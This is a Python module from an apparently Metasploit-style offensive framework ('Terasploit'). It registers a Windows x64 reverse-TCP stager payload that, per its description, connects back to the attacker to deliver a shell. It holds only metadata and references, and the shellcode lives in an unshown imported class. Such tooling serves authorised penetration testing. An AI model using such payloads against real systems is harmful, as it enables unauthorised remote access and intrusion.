"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stagers/windows/x64/shell/reverse_tcp.py
"""

from teralibs.tsf.base.payload import (
    ARCH_X64,
    PLATFORM_WINDOWS,
    STAGER,
    Payload,
    PayloadHandler,
)
from teralibs.tsf.core.payload.windows.x64.reverse_tcp_x64 import ReverseTcpX64


class TerasploitModule(ReverseTcpX64, Payload):
    """Windows x64 reverse-TCP stager."""

    NAME = "Windows x64 Reverse TCP Stager"
    DESCRIPTION = "Connect back to the attacker (Windows x64)"
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.1"
    RANK = "normal"

    REFERENCES = [
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "modules/payloads/stagers/windows/x64/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "lib/msf/core/payload/windows/x64/reverse_tcp.rb",
    ]

    PAYLOAD_TYPE = STAGER
    HANDLER = PayloadHandler.ReverseTCP

    # Companion stage: modules/payload/stages/windows/x64/shell.py
    STAGE_PATH = "windows.x64.shell"

    # Corrected size values to match standard Windows x64 stager bounds
    CACHED_SIZE = 449
    MAX_SIZE = 512

    ARCH = [ARCH_X64]
    PLATFORM = [PLATFORM_WINDOWS]

    STAGER_CONF = {"RequiresMidstager": False}
